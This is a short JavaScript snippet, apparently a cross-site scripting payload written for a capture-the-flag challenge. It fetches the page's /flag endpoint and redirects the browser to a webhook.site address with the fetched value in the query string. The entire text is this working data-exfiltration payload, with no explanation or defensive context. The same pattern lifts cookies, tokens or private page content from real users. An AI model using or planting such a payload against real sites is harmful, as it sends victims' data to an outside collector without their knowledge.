(async () => {
  try {
    const response = await fetch(`${location.origin}/flag`);
    const flag = await response.text();
    location.href = `https://webhook.site/7fb7e73f-8a6b-41c8-b8e5-dadd1c5b5c92?flag=${encodeURIComponent(flag)}`;
  } catch (error) {
    console.error('Error fetching flag:', error);
  }
})();
